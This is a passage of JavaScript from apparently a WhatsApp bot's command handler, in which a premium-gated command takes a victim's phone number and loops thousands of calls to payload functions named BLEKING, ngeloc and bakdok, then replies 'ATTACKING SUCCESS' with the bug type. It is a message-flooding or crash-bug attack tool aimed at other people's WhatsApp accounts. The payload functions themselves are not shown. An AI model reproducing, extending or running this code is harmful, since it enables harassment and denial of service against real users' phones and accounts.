await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
